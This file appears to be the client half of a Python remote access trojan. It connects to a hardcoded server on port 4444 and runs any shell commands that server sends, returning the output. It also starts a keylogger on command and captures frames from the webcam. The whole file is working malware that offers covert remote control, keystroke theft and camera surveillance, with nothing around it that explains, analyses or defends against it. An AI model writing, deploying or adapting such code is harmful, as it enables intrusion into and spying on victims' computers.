import socket
import subprocess
import json
import os
import base64
import cv2
import threading
from pynput.keyboard import Listener

class Client:
    def __init__(self, ip, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((ip, port))
        self.is_keylogging = False
        self.keylogs = ""
        self.stream = b""

    def send_data(self, data):
        json_data = json.dumps(data)
        encrypted = base64.b64encode(json_data.encode()).decode()
        self.conn.send(encrypted.encode())

    def receive_data(self):
        encrypted = self.conn.recv(1024).decode()
        json_data = base64.b64decode(encrypted).decode()
        return json.loads(json_data)

    def execute_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, text=True)
        except subprocess.CalledProcessError:
            return "[Error] Command execution failed."

    def start_keylogger(self):
        def log_keys(key):
            try:
                if key == key.space:
                    self.keylogs += " "
                elif key == key.enter:
                    self.keylogs += "[ENTER]"
                else:
                    self.keylogs += str(key).replace("'", "")
            except Exception:
                pass

        with Listener(on_press=log_keys) as listener:
            listener.join()

    def stop_keylogger(self):
        self.is_keylogging = False

    def webcam_stream(self):
        cap = cv2.VideoCapture(0)
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            _, buffer = cv2.imencode('.jpg', frame)
            self.stream = buffer.tobytes()

    def run(self):
        while True:
            command = self.receive_data()
            if command[0] == "exit":
                self.conn.close()
                break
            elif command[0] == "shell":
                output = self.execute_command(" ".join(command[1:]))
            elif command[0] == "keymon" and command[1] == "on":
                self.is_keylogging = True
                threading.Thread(target=self.start_keylogger).start()
                output = "Keylogger started"
            elif command[0] == "keymon" and command[1] == "off":
                self.is_keylogging = False
                output = "Keylogger stopped"
            elif command[0] == "webcam_stream":
                threading.Thread(target=self.webcam_stream).start()
                output = "Webcam streaming started"
            else:
                output = "[Error] Unknown command"
            self.send_data(output)

client = Client("10.0.1.33", 4444)  # Replace "server_ip" with the actual server IP
client.run()
